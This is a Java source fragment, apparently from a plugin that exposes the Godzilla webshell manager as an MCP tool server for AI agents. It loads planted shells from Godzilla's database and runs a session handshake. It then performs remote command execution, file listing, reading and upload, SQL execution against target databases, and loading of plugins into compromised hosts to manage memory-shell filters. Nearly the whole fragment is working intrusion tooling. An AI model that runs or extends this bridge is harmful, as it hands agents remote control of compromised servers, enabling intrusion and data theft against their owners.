            return new String(p.evalFunc("plugin.FilterManage", "getAllFilter", new util.http.ReqParameter()), StandardCharsets.UTF_8);
        });
    }

    private String filterShellRemoveTool(JsonObject a) throws Exception {
        final String filterName = requireParam(a, "filterName");
        return onTarget(a, p -> {
            if (!p.include("plugin.FilterManage", readResBytes("/shells/plugins/java/assets/FilterManage.classs"))) {
                throw new Exception("FilterManage 插件加载失败");
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            rp.add("filterName", filterName);
            return new String(p.evalFunc("plugin.FilterManage", "unFilter", rp), StandardCharsets.UTF_8);
        });
    }

    private String zipTool(JsonObject a) throws Exception {
        final String action = requireParam(a, "action");
        final String src = requireParam(a, "src");
        final String dest = requireParam(a, "dest");
        return onTarget(a, p -> {
            if (!p.include("JZip", readResBytes("/shells/plugins/java/assets/JZip.classs"))) {
                throw new Exception("JZip 插件加载失败");
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            if ("unzip".equalsIgnoreCase(action)) {
                rp.add("compressFile", src);
                rp.add("compressDir", dest);
                return new String(p.evalFunc("JZip", "unZip", rp), StandardCharsets.UTF_8);
            }
            rp.add("compressFile", dest);
            rp.add("compressDir", src);
            return new String(p.evalFunc("JZip", "zip", rp), StandardCharsets.UTF_8);
        });
    }

    private Payload getOrInitPayload(String url) throws Exception {
            if (payloadCache.containsKey(url)) {
                log("[MCP] 使用缓存 Payload: " + url);
                return payloadCache.get(url);
            }

            log("[MCP] ==== 开始初始化 Payload ====");
            log("[MCP] targetUrl: " + url);
            ShellEntity entity = Db.getOneShell(url);

            // Godzilla 的 getOneShell 可能按 ID 而非 URL 查找，直接查 DB 做 URL 匹配
            if (entity == null) {
                log("[MCP] getOneShell(url) 返回 null，遍历 DB 匹配 URL...");
                Vector<Vector<String>> allShells = Db.getAllShell();
                String foundId = null;
                for (Vector<String> row : allShells) {
                    if (row.size() >= 2) {
                        String dbUrl = row.get(1).toString();
                        // 允许 http/https 互换
                        if (dbUrl.equals(url) ||
                                dbUrl.replace("https://", "http://").equals(url.replace("https://", "http://"))) {
                            foundId = row.get(0).toString();
                            log("[MCP] URL 匹配成功: id=" + foundId + ", url=" + dbUrl);
                            break;
                        }
                    }
                }
                if (foundId != null) {
                    entity = Db.getOneShell(foundId);
                    if (entity != null) {
                        log("[MCP] 通过 ID 加载成功: " + foundId);
                    }
                }
            }

            if (entity == null) {
                log("[MCP] ERROR: 最终未能加载 Shell: " + url);
                Vector<Vector<String>> allShells = Db.getAllShell();
                log("[MCP] DB 中现有 URL:");
                for (Vector<String> row : allShells) {
                    if (row.size() >= 2) log("[MCP]   " + row.get(1));
                }
                throw new Exception("Shell URL not found in database: " + url +
                        "。请先用 list_shells 确认正确的 URL。");
            }

            log("[MCP] Shell 信息: payload=" + entity.getPayload() +
                    ", cryption=" + entity.getCryption() +
                    ", password=" + entity.getPassword() +
                    ", secretKey=" + (entity.getSecretKey() != null ? "***" : "null"));

            log("[MCP] 调用 initShellOpertion() ...");
            entity.initShellOpertion();
            log("[MCP] initShellOpertion() 完成");

            Payload p = entity.getPayloadModule();
            if (p == null) {
                throw new Exception("getPayloadModule() 返回 null: " + url);
            }
            log("[MCP] Payload 类型: " + p.getClass().getName());

            // Godzilla 加密协议：第一次请求建立加密会话，回包通常为 [] 或空
            // 需要先发送一次请求完成握手，第二次请求才能拿到真实数据
            log("[MCP] 发送握手请求 (getBasicsInfo 第1次) ...");
            String handshake = p.getBasicsInfo();
            log("[MCP] 握手回包: " + (handshake == null ? "null" :
                    (handshake.length() > 200 ? handshake.substring(0, 200) + "..." : handshake)));

            // 第二次请求获取实际数据，验证连通性
            log("[MCP] 发送验证请求 (getBasicsInfo 第2次) ...");
            String verify = p.getBasicsInfo();
            log("[MCP] 验证回包: " + (verify == null ? "null" :
                    (verify.length() > 200 ? verify.substring(0, 200) + "..." : verify)));

            if (verify == null || verify.isEmpty() || "[]".equals(verify.trim())) {
                log("[MCP] ERROR: Shell 无响应，两次请求均返回空 - " + url);
                throw new Exception("Shell 无响应: " + url +
                        "。请先在哥斯拉客户端双击该连接确认存活。");
            }

            log("[MCP] ====== Payload 就绪 ======");
            payloadCache.put(url, p);
            return p;
        }

        private String executePayloadAction(Payload payload, String action, JsonObject params) throws Exception {
            switch (action) {
                case "getBasicsInfo":
                    return payload.getBasicsInfo();
                case "execCommand":
                    return toSafeBase64(payload.execCommand(requireParam(params, "command")));
                case "listFile":
                    return toSafeBase64(payload.getFile(requireParam(params, "dirPath")));
                case "readFile": {
                    String fileContent = payload.getFile(requireParam(params, "filePath"));
                    return fileContent != null
                            ? Base64.getEncoder().encodeToString(fileContent.getBytes(StandardCharsets.UTF_8))
                            : null;
                }
                case "uploadFile":
                    byte[] uploadData = Base64.getDecoder().decode(requireParam(params, "base64Data"));
                    return payload.uploadFile(requireParam(params, "filePath"), uploadData) ? "Success" : "Failed";
                case "execSql":
                    return payload.execSql(
                            requireParam(params, "dbType"), requireParam(params, "dbHost"),
                            params.get("dbPort").getAsInt(), requireParam(params, "dbUser"),
                            requireParam(params, "dbPass"), requireParam(params, "dbName"),
                            params.get("execType").getAsJsonObject().asMap(), requireParam(params, "execSql")
                    );
                default:
                    throw new Exception("Unknown action: " + action);
            }
        }

        // ========== HTTP 响应工具方法 ==========

        /** 安全获取必填参数，不存在或为 null 则抛异常 */
        private static String requireParam(JsonObject args, String name) throws Exception {
            if (args == null || !args.has(name)) {
                throw new Exception("缺少必填参数 '" + name + "'");
            }
            JsonElement elem = args.get(name);
            if (elem == null || elem.isJsonNull()) {
                throw new Exception("参数 '" + name + "' 不能为空");
            }
            return elem.getAsString();
        }

        /** 异常 → 日志安全字符串（NPE 的 getMessage() 返回 null） */
        private static String stringifyError(Throwable e) {
            String msg = e.getMessage();
            return msg != null ? msg : e.getClass().getName();
        }

        /** 打印完整堆栈到日志 */
        private static void logStackTrace(Throwable e) {
            try (java.io.StringWriter sw = new java.io.StringWriter();
                 java.io.PrintWriter pw = new java.io.PrintWriter(sw)) {
                e.printStackTrace(pw);
                pw.flush();
                log(sw.toString());
            } catch (Exception ignored) {}
        }

        /** 文件/目录结果 Base64 装箱，防乱码炸 Gson */
        private static String toSafeBase64(String raw) {
            if (raw == null) return null;
            return Base64.getEncoder().encodeToString(raw.getBytes(StandardCharsets.UTF_8));
        }

        private void sendJsonRpcSuccess(HttpExchange exchange, JsonElement id, JsonElement result) throws IOException {
            JsonObject response = new JsonObject();
            response.addProperty("jsonrpc", "2.0");
            if (id != null) response.add("id", id);
            response.add("result", result);
            sendHttpResponse(exchange, 200, response.toString());
        }

        private void sendJsonRpcError(HttpExchange exchange, JsonElement id, int code, String message) throws IOException {
            JsonObject response = new JsonObject();
            response.addProperty("jsonrpc", "2.0");
            if (id != null) response.add("id", id);
            JsonObject error = new JsonObject();
            error.addProperty("code", code);
            error.addProperty("message", message);
            response.add("error", error);
            sendHttpResponse(exchange, 200, response.toString());
        }

        private void sendHttpJsonResponse(HttpExchange exchange, int statusCode, String body) throws IOException {
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().set("Content-Type", "application/json; charset=UTF-8");
            exchange.sendResponseHeaders(statusCode, bytes.length > 0 ? bytes.length : -1);
            if (bytes.length > 0) {
                OutputStream os = exchange.getResponseBody();
                os.write(bytes);
                os.close();
            }
        }

        private void sendHttpResponse(HttpExchange exchange, int statusCode, String body) throws IOException {
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().set("Content-Type", "application/json; charset=UTF-8");
            exchange.sendResponseHeaders(statusCode, bytes.length);
            OutputStream os = exchange.getResponseBody();
            os.write(bytes);
            os.close();
        }
    }
}

/* [headless patch] 独立无头入口 */
class GodzillaMcpHeadlessBootstrap {
    public static void main(String[] args) throws Exception {
        System.setProperty("godzilla.mcp.headless", "true");
        GodzillaMcpServerPlugin.main(args);
    }
}
